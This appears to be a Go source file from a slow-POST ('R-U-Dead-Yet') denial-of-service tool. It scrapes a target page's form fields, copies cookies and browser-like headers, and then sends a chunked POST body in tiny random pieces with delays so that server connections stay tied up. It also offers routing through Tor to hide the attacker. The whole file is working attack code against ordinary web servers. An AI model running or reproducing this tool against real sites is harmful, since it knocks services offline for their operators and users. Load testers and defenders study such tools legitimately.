package request

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/darkweak/rudy/logger"
	"golang.org/x/net/html"
)

type request struct {
	client      *http.Client
	delay       time.Duration
	payloadSize int64
	req         *http.Request
	data        []byte
}

var sslKeyFile *os.File
var TargetFieldName string
var Context context.Context

func GetFormFields(u string) (map[int]string, error) {
	client := http.DefaultClient
	fields := map[int]string{}
	count := 0

	resp, err := client.Get(u)
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		htmlData, _ := html.Parse(resp.Body)
		

		var f func(*html.Node)
		f = func(n *html.Node) {
			if n.Type == html.ElementNode && n.Data == "form" {
				for c := n.FirstChild; c != nil; c = c.NextSibling {
					f(c)
				}
			}
		    
			if n.Type == html.ElementNode && n.Data == "input" {
				hasTypeAttr := false
        		hasNameAttr := false
				var nameAttrVal string
				for _, attr := range n.Attr {
					if attr.Key == "type" && attr.Val == "text" {
						hasTypeAttr = true
					}
					if attr.Key == "name" || attr.Key == "id" {
						hasNameAttr = true
						nameAttrVal = attr.Val
					}
				}

				if hasNameAttr && hasTypeAttr {
					count++
					fields[count] = nameAttrVal
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				f(c)
			}
		}

		f(htmlData)
	}

	return fields, nil
}

func (r *request) initRequestHeaders(u string) {

	req := r.req
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36")

	resp, err := r.client.Get(u)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		for _, v := range resp.Cookies() {
			req.AddCookie(v)
		}
	}
}

func (r *request) setFieldsPayloadOnBuffer(b []byte) []byte {
	var ret []byte
	if b == nil {
		empty := make([]byte, r.payloadSize)
		ret = append([]byte(TargetFieldName), empty...)
	} else {
		ret = append([]byte(TargetFieldName), b...)
	}

	return ret
}

func NewRequest(size int64, u string, delay time.Duration, data []byte) *request {
	req, _ := http.NewRequest(http.MethodPost, u, nil)
	req.ProtoMajor = 1
	req.ProtoMinor = 1
	req.TransferEncoding = []string{"chunked"}

	//Used for Wireshark TLS decrypt
	if value, exists := os.LookupEnv("SSLKEYLOGFILE"); exists {
		sslKeyFile, _ = os.OpenFile(value, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	}
	
	
	client := http.DefaultClient
	client.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{
			KeyLogWriter: sslKeyFile,
		},
	}
	
	ret := &request{
		client:      client,
		delay:       delay,
		payloadSize: size,
		req:         req,
		data:        data,
	}

	ret.initRequestHeaders(u)

	return ret
}

func (r *request) WithTor(endpoint string) *request {
	torProxy, err := url.Parse(endpoint)
	if err != nil {
		panic("Failed to parse proxy URL:" + err.Error())
	}
	
	var transport http.Transport
	transport.Proxy = http.ProxyURL(torProxy)
	r.client.Transport = &transport
	
	return r
}

func (r *request) Send() error {
	pipeReader, pipeWriter := io.Pipe()
	r.req.Body = pipeReader
	closerChan := make(chan int)
	
	defer func(){
		close(closerChan)
		sslKeyFile.Close()
	}()
		
		
	go func() {
		var buf []byte
		var bytesSent uint32
		newBuffer := bytes.NewBuffer(r.setFieldsPayloadOnBuffer(r.data))
	
		bufferLen := newBuffer.Len()
		
		defer pipeWriter.Close()
		
		for {
			select {
			case <-closerChan:
			case <-Context.Done():
				return
			default:
				bufSize := rand.Intn(30) + 1   
				buf = make([]byte, min(uint32(bufferLen) - bytesSent, uint32(bufSize)))
				if n, _ := newBuffer.Read(buf); n == 0 {
					return
				}
				
				_, _ = pipeWriter.Write(buf)
				bytesSent += uint32(len(buf))
				logger.Logger.Sugar().Infof("Sent %d bytes of %d to %s", bytesSent, r.payloadSize, r.req.URL)
				time.Sleep(r.delay)
			}
		}
	}()
		
	var err error
	if _, err = r.client.Do(r.req); err != nil {
		err = fmt.Errorf("an error occurred during the request: %w", err)
		logger.Logger.Sugar().Error(err)
		closerChan <- 1
	}
			
	return err
}
			